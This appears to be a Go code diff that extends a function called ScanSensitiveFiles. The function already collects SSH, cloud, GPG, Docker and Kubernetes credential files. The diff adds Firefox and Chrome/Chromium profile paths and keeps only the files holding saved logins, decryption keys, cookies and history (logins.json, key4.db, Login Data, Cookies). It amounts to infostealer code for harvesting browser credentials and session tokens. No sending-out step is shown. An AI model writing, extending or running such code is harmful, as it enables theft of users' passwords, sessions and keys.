@@ -66,6 +66,7 @@ func ScanSensitiveFiles(outputDir string) ([]string, error) {
 		".ssh", ".aws", ".gnupg", ".git-credentials", ".gitconfig", ".docker",
 		".kube", ".config/gcloud", ".azure", ".openvpn", ".profile", ".npmrc",
 		".pypirc", ".netrc", ".local/share/keyrings", "secrets", ".bashrc", ".zshrc",
+		".mozilla/firefox", ".config/google-chrome", ".config/chromium",
 	}
 
 	// System-level paths
@@ -146,6 +147,27 @@ func ScanSensitiveFiles(outputDir string) ([]string, error) {
 	return files, nil
 }
 
+// Define critical files for browsers
+var criticalBrowserFiles = map[string][]string{
+	".mozilla/firefox":      {"cookies.sqlite", "key4.db", "logins.json", "places.sqlite"},
+	".config/google-chrome": {"Cookies", "Login Data", "Web Data", "Bookmarks", "History"},
+	".config/chromium":      {"Cookies", "Login Data", "Web Data", "Bookmarks", "History"},
+}
+
+// Filter browser files by critical filenames
+func isCriticalBrowserFile(path string, _ string) bool {
+	for basePath, criticalFiles := range criticalBrowserFiles {
+		if strings.Contains(path, basePath) {
+			for _, critical := range criticalFiles {
+				if strings.HasSuffix(path, critical) {
+					return true
+				}
+			}
+		}
+	}
+	return false
+}
+
 // expandPath expands directories into a list of files, excluding symlinks.
 func expandPath(path string) []string {
 	var fileList []string
@@ -153,19 +175,19 @@ func expandPath(path string) []string {
 	err := filepath.Walk(path, func(p string, info os.FileInfo, err error) error {
 		if err != nil {
 			// Log the error but continue
-			//fmt.Printf("Error accessing %s: %v\n", p, err)
 			return nil
 		}
 
 		// Skip symlinks
 		if info.Mode()&os.ModeSymlink != 0 {
-			//fmt.Printf("Skipping symlink: %s\n", p) // Debug log
 			return nil
 		}
 
-		// Add files that are not directories and are accessible
+		// Add files that match critical browser file criteria
 		if !info.IsDir() && canAccessFile(p) {
-			fileList = append(fileList, p)
+			if isCriticalBrowserFile(p, path) || !strings.Contains(path, ".mozilla/firefox") && !strings.Contains(path, ".config/google-chrome") && !strings.Contains(path, ".config/chromium") {
+				fileList = append(fileList, p)
+			}
 		}
 
 		return nil
